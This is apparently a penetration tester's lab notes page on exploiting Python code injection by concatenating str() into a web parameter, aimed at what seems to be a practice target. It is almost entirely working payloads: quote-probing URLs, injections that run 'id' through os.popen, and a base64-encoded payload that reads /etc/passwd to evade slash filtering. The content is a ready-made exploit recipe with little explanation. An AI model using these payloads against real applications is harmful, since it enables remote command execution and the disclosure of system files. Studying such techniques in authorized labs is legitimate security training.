# str() in Python

### Common Command Injection Step

{% code overflow="wrap" %}
```bash
# Check if you can insert the following characters for param=value
# ' 
# "
# and see if you get an error.
https://ptl-ac88f0b5-ecbb39a9.libcurl.so/hello/hacker'
https://ptl-ac88f0b5-ecbb39a9.libcurl.so/hello/hacker"

# Add another comma or double-quote to see if the error goes away. 
hacker''
hacker""

# Then add a + (plus) inside the two commas or double-quotes. 
hacker"+" 
hacker"+""+" 

# %2b = + 
# Add a character inside the characters - "+"a"+" and if you get not error. 
hacker"%2b"a"%2b"

# Add the payload "+str(1)+" 
hacker"%2bstr(1)%2b"

# check the payload works - "+str(os.popen("id").read())+" 
hacker"%2bstr(os.popen("id").read())%2b"

# Chekc if the payload works - '+str(__import__('os').popen('id').read())+' 
engine=Accuweather&query=1'%2bstr(__import__('os').popen('id').read())%2b'

```
{% endcode %}

### Base64 based Command Injection Step

{% code overflow="wrap" %}
```bash
# Check if you can use / (slash) inside the command. Sometimes, it does nott work. 
# In this case, you need to encode the string and decode at the runtime.

# Encode the command that you want to execute
echo 'cat /etc/passwd' | base64

# This is the result
Y2F0IC9ldGMvcGFzc3dkCg==

# Add the result to the following payload
__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dkCg==')

# Let's use the following template
str(__import__('os').popen(<payload>).read())

# base64 decode-able payload looks like below
str(__import__('os').popen(__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dkCg==')).read())

# Final payload looks like below
hacker"%2bstr(__import__('os').popen(__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dkCg==')).read())%2b"

```
{% endcode %}
